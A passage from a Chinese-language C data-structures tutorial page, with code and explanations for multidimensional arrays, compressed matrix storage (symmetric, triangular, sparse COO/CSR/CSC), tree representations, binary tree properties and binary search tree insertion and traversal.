class="hljs-title">down</span>; q-&gt;</span>down = p; <span class="hljs-comment">/*寻找列表中的插入位置*/</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="三维数组"><a href="#三维数组" class="headerlink" title="三维数组"></a>三维数组</h4><p>三维数组是数组的进一步扩展，通常用于表示多维空间中的数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> array3D[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>][<span class="hljs-number">4</span>] = &#123;<br>    &#123;<br>        &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;,<br>        &#123;<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>&#125;,<br>        &#123;<span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>&#125;<br>    &#125;,<br>    &#123;<br>        &#123;<span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>&#125;,<br>        &#123;<span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>&#125;,<br>        &#123;<span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>&#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>访问三维数组元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> value = array3D[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]; <span class="hljs-comment">// 获取第二个2D数组的第三行第四列的元素</span><br></code></pre></td></tr></table></figure><h3 id="矩阵的压缩存储"><a href="#矩阵的压缩存储" class="headerlink" title="矩阵的压缩存储"></a>矩阵的压缩存储</h3><p>矩阵压缩存储用于节省空间，特别是在矩阵具有某种特殊结构时，例如对称矩阵、三角矩阵和稀疏矩阵。</p><h4 id="对称矩阵"><a href="#对称矩阵" class="headerlink" title="对称矩阵"></a>对称矩阵</h4><p>对称矩阵是指矩阵的元素满足 <code>A[i][j] == A[j][i]</code>。对于对称矩阵，只需要存储矩阵的上三角或下三角部分即可。</p><p>假设存储上三角部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> n = <span class="hljs-number">3</span>; <span class="hljs-comment">// 矩阵的维度</span><br><span class="hljs-type">int</span> symmetricMatrix[(n * (n + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span>]; <span class="hljs-comment">// 存储上三角部分的数组</span><br><br><span class="hljs-comment">// 计算索引</span><br><span class="hljs-type">int</span> index = (i * (i + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + j;<br>symmetricMatrix[index] = value;<br></code></pre></td></tr></table></figure><p>访问元素时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">getSymmetricMatrixValue</span><span class="hljs-params">(<span class="hljs-type">int</span>* mat, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i &lt;= j) &#123;<br>        <span class="hljs-keyword">return</span> mat[(i * (i + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + j];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> mat[(j * (j + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + i];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="三角矩阵"><a href="#三角矩阵" class="headerlink" title="三角矩阵"></a>三角矩阵</h4><ul><li><strong>上三角矩阵</strong>：只存储非零的上三角部分。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> upperTriangular[(n * (n + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span>];<br></code></pre></td></tr></table></figure><p>存储上三角矩阵的元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (i &lt;= j) &#123;<br>    upperTriangular[(i * n) - (i * (i - <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + (j - i)] = value;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>下三角矩阵</strong>：只存储非零的下三角部分。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> lowerTriangular[(n * (n + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span>];<br></code></pre></td></tr></table></figure><p>存储下三角矩阵的元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (i &gt;= j) &#123;<br>    lowerTriangular[(i * (i + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + j] = value;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="稀疏矩阵压缩存储"><a href="#稀疏矩阵压缩存储" class="headerlink" title="稀疏矩阵压缩存储"></a>稀疏矩阵压缩存储</h4><p>稀疏矩阵是指大部分元素为零的矩阵。稀疏矩阵可以通过三元组（行、列、值）来压缩存储。常见的存储方法包括COO（Coordinate List）、CSR（Compressed Sparse Row）和CSC（Compressed Sparse Column）。</p><ul><li><strong>COO（Coordinate List）</strong>：使用三个数组分别存储非零元素的行索引、列索引和对应的值。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> row[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br><span class="hljs-type">int</span> col[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">int</span> val[] = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>CSR（Compressed Sparse Row）</strong>：使用三个数组存储稀疏矩阵，分别是 <code>values</code>（非零元素的值），<code>col_index</code>（非零元素所在的列索引）和 <code>row_pointer</code>（每行开始的位置）。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> values[] = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>&#125;;<br><span class="hljs-type">int</span> col_index[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">int</span> row_pointer[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>CSC（Compressed Sparse Column）</strong>：与CSR类似，使用三个数组存储稀疏矩阵，只不过是按列进行存储。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> values[] = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">30</span>, <span class="hljs-number">20</span>, <span class="hljs-number">40</span>&#125;;<br><span class="hljs-type">int</span> row_index[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>&#125;;<br><span class="hljs-type">int</span> col_pointer[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br></code></pre></td></tr></table></figure><p>这些压缩存储方法通过只存储非零元素和它们的位置，大大减少了稀疏矩阵所需的存储空间。</p><h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><p>树的存储结构主要有三种：<strong>双亲表示法</strong>、<strong>孩子表示法</strong>和<strong>孩子兄弟表示法</strong></p><pre><code class="hljs">     A   / | \  B  C  D / \    |E   F   G</code></pre><p>双亲表示法—-适合查找节点的父节点，但是在查找孩子节点时效率较低</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    ElementType data; <span class="hljs-comment">// 数据域，存储节点的值</span><br>    <span class="hljs-type">int</span> parent;       <span class="hljs-comment">// 存储父节点的索引（若是根节点，父节点设为-1）</span><br>&#125; PTNode;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    PTNode nodes[MAX_SIZE]; <span class="hljs-comment">// 存储节点的数组</span><br>    <span class="hljs-type">int</span> n;                  <span class="hljs-comment">// 树中节点的数量</span><br>&#125; PTree;<br><br></code></pre></td></tr></table></figure><p>在双亲表示法中，每个节点记录自己的父节点索引：</p><table><thead><tr><th>索引</th><th>数据</th><th>父节点索引</th></tr></thead><tbody><tr><td>0</td><td>A</td><td>-1</td></tr><tr><td>1</td><td>B</td><td>0</td></tr><tr><td>2</td><td>C</td><td>0</td></tr><tr><td>3</td><td>D</td><td>0</td></tr><tr><td>4</td><td>E</td><td>1</td></tr><tr><td>5</td><td>F</td><td>1</td></tr><tr><td>6</td><td>G</td><td>3</td></tr></tbody></table><p>在这个例子中，“A”节点是根节点，因此它的父节点索引为 <code>-1</code>。每个节点的父节点索引指向它在数组中的位置。</p><p>孩子表示法—-适合查找节点的孩子，尤其是树的度较大时</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> ChildNode &#123;<br>    <span class="hljs-type">int</span> child;                <span class="hljs-comment">// 指向孩子节点的索引</span><br>    <span class="hljs-keyword">struct</span> ChildNode *next;   <span class="hljs-comment">// 指向下一个孩子节点</span><br>&#125; ChildNode;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    ElementType data;        <span class="hljs-comment">// 数据域，存储节点的值</span><br>    ChildNode *firstChild;   <span class="hljs-comment">// 孩子链表的头指针</span><br>&#125; <span class="hljs-built_in">CTNode</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-built_in">CTNode</span> nodes[MAX_SIZE]; <span class="hljs-comment">// 节点数组</span><br>    <span class="hljs-type">int</span> n;                  <span class="hljs-comment">// 树中节点的数量</span><br>&#125; <span class="hljs-built_in">CTree</span>;<br><br></code></pre></td></tr></table></figure><p><strong>A</strong> → <strong>孩子链表</strong> → B → C → D</p><p><strong>B</strong> → <strong>孩子链表</strong> → E → F</p><p><strong>C</strong> → <strong>孩子链表</strong> → (空)</p><p><strong>D</strong> → <strong>孩子链表</strong> → G</p><p><strong>E</strong> → <strong>孩子链表</strong> → (空)</p><p><strong>F</strong> → <strong>孩子链表</strong> → (空)</p><p><strong>G</strong> → <strong>孩子链表</strong> → (空)</p><p>孩子兄弟表示法—-适合同时查找孩子和兄弟节点。此结构将多叉树转换为二叉树，有利于在实际中使用二叉树的算法来处理多叉树</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss">typedef <span class="hljs-keyword">struct</span> <span class="hljs-type">CSNode</span> &#123;<br>    ElementType data;         <span class="hljs-comment">// 数据域，存储节点的值</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">CSNode</span> *firstChild; <span class="hljs-comment">// 左孩子指针，指向第一个孩子节点</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">CSNode</span> *nextSibling; <span class="hljs-comment">// 右兄弟指针，指向右兄弟节点</span><br>&#125; CSNode, *CSTree;<br><br></code></pre></td></tr></table></figure><p><strong>A</strong> → <strong>firstChild</strong> → B</p><p><strong>B</strong> → <strong>firstChild</strong> → E, <strong>nextSibling</strong> → C</p><p><strong>C</strong> → <strong>nextSibling</strong> → D</p><p><strong>D</strong> → <strong>firstChild</strong> → G</p><p><strong>E</strong> → <strong>nextSibling</strong> → F</p><p><strong>F</strong> → <strong>nextSibling</strong> → (空)</p><p><strong>G</strong> → <strong>nextSibling</strong> → (空)</p><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><p>节点数的性质</p><ul><li><strong>性质 1</strong>：对任何一棵非空二叉树，第 iii 层上的<strong>最多节点数</strong>为 2i−12^{i-1}2i−1（i≥1i \geq 1i≥1）。<ul><li>例如，第 1 层最多有 21−1&#x3D;12^{1-1} &#x3D; 121−1&#x3D;1 个节点，第 2 层最多有 22−1&#x3D;22^{2-1} &#x3D; 222−1&#x3D;2 个节点，第 3 层最多有 23−1&#x3D;42^{3-1} &#x3D; 423−1&#x3D;4 个节点，依此类推。</li></ul></li><li><strong>性质 2</strong>：深度为 kkk 的二叉树的<strong>最多节点数</strong>为 2k−12^k - 12k−1（k≥1k \geq 1k≥1）。<ul><li>例如，深度为 3 的二叉树最多有 23−1&#x3D;72^3 - 1 &#x3D; 723−1&#x3D;7 个节点。</li></ul></li><li><strong>性质 3</strong>：对任何一棵二叉树，若其叶节点数为 n0n_0n0，度为 2 的节点数为 n2n_2n2，则满足关系式：n0&#x3D;n2+1n_0 &#x3D; n_2 + 1n0&#x3D;n2+1。<ul><li>这个性质帮助我们快速计算一棵二叉树的叶节点和度为 2 的节点之间的关系。</li></ul></li></ul><hr><p> 完全二叉树的性质</p><ul><li><strong>性质 4</strong>：如果一棵<strong>完全二叉树</strong>有 nnn 个节点，则这些节点可以从上至下、从左到右编号为 1 到 nnn。对于任意节点 iii（1 ≤ iii ≤ nnn）：<ul><li>若 i&#x3D;1i &#x3D; 1i&#x3D;1，则节点 iii 是根节点。</li><li>若 i&gt;1i &gt; 1i&gt;1，则节点 iii 的<strong>父节点</strong>编号为 ⌊i&#x2F;2⌋\lfloor i&#x2F;2 \rfloor⌊i&#x2F;2⌋。</li><li>若 2i≤n2i \leq n2i≤n，则节点 iii 的<strong>左孩子</strong>编号为 2i2i2i。</li><li>若 2i+1≤n2i + 1 \leq n2i+1≤n，则节点 iii 的<strong>右孩子</strong>编号为 2i+12i + 12i+1。</li></ul></li></ul><hr><p> 二叉树的深度和高度关系</p><ul><li><strong>性质 5</strong>：对于一棵有 nnn 个节点的完全二叉树，其<strong>深度（或高度）</strong>为 ⌊log⁡2n⌋+1\lfloor \log_2 n \rfloor + 1⌊log2n⌋+1。<ul><li>例如，一棵有 7 个节点的完全二叉树的深度为 ⌊log⁡27⌋+1&#x3D;3\lfloor \log_2 7 \rfloor + 1 &#x3D; 3⌊log27⌋+1&#x3D;3。</li></ul></li></ul><hr><p>满二叉树的性质</p><ul><li><strong>性质 6</strong>：一棵深度为 kkk 的<strong>满二叉树</strong>的节点数为 2k−12^k - 12k−1。<ul><li>满二叉树指的是每一层都被完全填满的二叉树，没有空缺。</li></ul></li><li><strong>性质 7</strong>：满二叉树的<strong>叶节点数</strong>等于度为 2 的节点数加 1，且所有的叶节点都在同一层。</li></ul><hr><p> 二叉树的节点之间的关系</p><ul><li><strong>性质 8</strong>：在二叉树的顺序存储中，父节点、左孩子和右孩子之间的索引关系可以简化操作：<ul><li>如果某节点的索引为 iii，则其左孩子的索引为 2i2i2i，右孩子的索引为 2i+12i + 12i+1，父节点的索引为 ⌊i&#x2F;2⌋\lfloor i&#x2F;2 \rfloor⌊i&#x2F;2⌋。</li></ul></li><li><strong>性质 9</strong>：在二叉树中，深度越大的层，其节点数呈指数增长。即在二叉树的末端层节点数最多，而根节点只有一个。</li></ul><p>二叉树顺序存储</p><pre><code class="hljs">     A   /   \  B     C / \   / \D   E F   G</code></pre><p>按照顺序存储的方式，这棵树会被存储在数组中如下：</p><table><thead><tr><th>索引</th><th>数据</th></tr></thead><tbody><tr><td>1</td><td>A</td></tr><tr><td>2</td><td>B</td></tr><tr><td>3</td><td>C</td></tr><tr><td>4</td><td>D</td></tr><tr><td>5</td><td>E</td></tr><tr><td>6</td><td>F</td></tr><tr><td>7</td><td>G</td></tr></tbody></table><p>在这个数组中：</p><ul><li>A 的左孩子是 B（索引 2），右孩子是 C（索引 3）。</li><li>B 的左孩子是 D（索引 4），右孩子是 E（索引 5）。</li><li>C 的左孩子是 F（索引 6），右孩子是 G（索引 7）。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100 <span class="hljs-comment">// 定义顺序存储二叉树的最大节点数</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> ElementType; <span class="hljs-comment">// 定义节点元素的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    ElementType data[MAX_SIZE]; <span class="hljs-comment">// 用数组存储二叉树的节点</span><br>    <span class="hljs-type">int</span> size;                   <span class="hljs-comment">// 记录二叉树的节点数量</span><br>&#125; SeqBinaryTree;<br><br><span class="hljs-comment">// 初始化二叉树</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">initTree</span><span class="hljs-params">(SeqBinaryTree *tree)</span> </span>&#123;<br>    tree-&gt;size = <span class="hljs-number">0</span>; <span class="hljs-comment">// 初始时二叉树为空</span><br>&#125;<br><br><span class="hljs-comment">// 添加节点到二叉树</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addNode</span><span class="hljs-params">(SeqBinaryTree *tree, ElementType data)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (tree-&gt;size + <span class="hljs-number">1</span> &lt; MAX_SIZE) &#123;<br>        tree-&gt;data[++(tree-&gt;size)] = data;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;二叉树已满，无法插入更多节点。\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 前序遍历二叉树（递归）</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">preOrderTraverse</span><span class="hljs-params">(SeqBinaryTree *tree, <span class="hljs-type">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (index &gt; tree-&gt;size) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 如果索引超过节点数，则返回</span><br><br>    <span class="hljs-comment">// 访问根节点</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c &quot;</span>, tree-&gt;data[index]);<br><br>    <span class="hljs-comment">// 递归访问左孩子</span><br>    <span class="hljs-built_in">preOrderTraverse</span>(tree, <span class="hljs-number">2</span> * index);<br><br>    <span class="hljs-comment">// 递归访问右孩子</span><br>    <span class="hljs-built_in">preOrderTraverse</span>(tree, <span class="hljs-number">2</span> * index + <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    SeqBinaryTree tree;<br>    <span class="hljs-built_in">initTree</span>(&amp;tree);<br><br>    <span class="hljs-comment">// 添加节点（按照层次顺序添加）</span><br>    <span class="hljs-built_in">addNode</span>(&amp;tree, <span class="hljs-string">&#x27;A&#x27;</span>); <span class="hljs-comment">// 根节点</span><br>    <span class="hljs-built_in">addNode</span>(&amp;tree, <span class="hljs-string">&#x27;B&#x27;</span>); <span class="hljs-comment">// 左孩子</span><br>    <span class="hljs-built_in">addNode</span>(&amp;tree, <span class="hljs-string">&#x27;C&#x27;</span>); <span class="hljs-comment">// 右孩子</span><br>    <span class="hljs-built_in">addNode</span>(&amp;tree, <span class="hljs-string">&#x27;D&#x27;</span>); <span class="hljs-comment">// B 的左孩子</span><br>    <span class="hljs-built_in">addNode</span>(&amp;tree, <span class="hljs-string">&#x27;E&#x27;</span>); <span class="hljs-comment">// B 的右孩子</span><br>    <span class="hljs-built_in">addNode</span>(&amp;tree, <span class="hljs-string">&#x27;F&#x27;</span>); <span class="hljs-comment">// C 的左孩子</span><br>    <span class="hljs-built_in">addNode</span>(&amp;tree, <span class="hljs-string">&#x27;G&#x27;</span>); <span class="hljs-comment">// C 的右孩子</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;前序遍历结果：&quot;</span>);<br>    <span class="hljs-built_in">preOrderTraverse</span>(&amp;tree, <span class="hljs-number">1</span>); <span class="hljs-comment">// 从根节点（索引 1）开始前序遍历</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>二叉树由节点组成，每个节点包含以下内容：</p><ul><li><strong>数据域</strong>：存储节点的数据。</li><li><strong>左子节点指针</strong>：指向左子节点。</li><li><strong>右子节点指针</strong>：指向右子节点。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// 定义二叉树的节点结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> &#123;</span><br>    <span class="hljs-type">int</span> data;                 <span class="hljs-comment">// 节点的数据</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> *<span class="hljs-title">left</span>;</span>    <span class="hljs-comment">// 指向左子节点</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> *<span class="hljs-title">right</span>;</span>   <span class="hljs-comment">// 指向右子节点</span><br>&#125; TreeNode;<br><br><span class="hljs-comment">// 创建节点</span><br>TreeNode* <span class="hljs-title function_">CreateNode</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> &#123;<br>    TreeNode *node = (TreeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(TreeNode));<br>    <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    node-&gt;data = value;<br>    node-&gt;left = <span class="hljs-literal">NULL</span>;<br>    node-&gt;right = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-comment">// 插入节点（基于二叉查找树的插入）</span><br>TreeNode* <span class="hljs-title function_">Insert</span><span class="hljs-params">(TreeNode *root, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> CreateNode(value);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (value &lt; root-&gt;data) &#123;<br>        root-&gt;left = Insert(root-&gt;left, value);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        root-&gt;right = Insert(root-&gt;right, value);<br>    &#125;<br>    <span class="hljs-keyword">return</span> root;<br>&#125;<br><br><span class="hljs-comment">// 前序遍历</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PreorderTraversal</span><span class="hljs-params">(TreeNode *root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span 